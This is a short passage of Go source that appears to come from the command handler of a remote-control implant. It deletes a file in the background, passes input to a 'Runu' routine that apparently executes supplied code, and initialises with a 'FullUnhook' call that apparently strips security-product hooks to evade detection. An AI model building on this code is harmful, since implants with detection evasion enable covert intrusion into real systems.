			communication.ErrorProcess(err)
			return
		}

		_, err = CmdRm([]byte(filePath))
		if err != nil {
			communication.ErrorProcess(err)
			return
		}
	}()

	return []byte("Hold on"), nil
}

func CmdRunu(b []byte) ([]byte, error) {
	return packet.Runu(b)
}

func Init() error {
	return packet.FullUnhook()
}
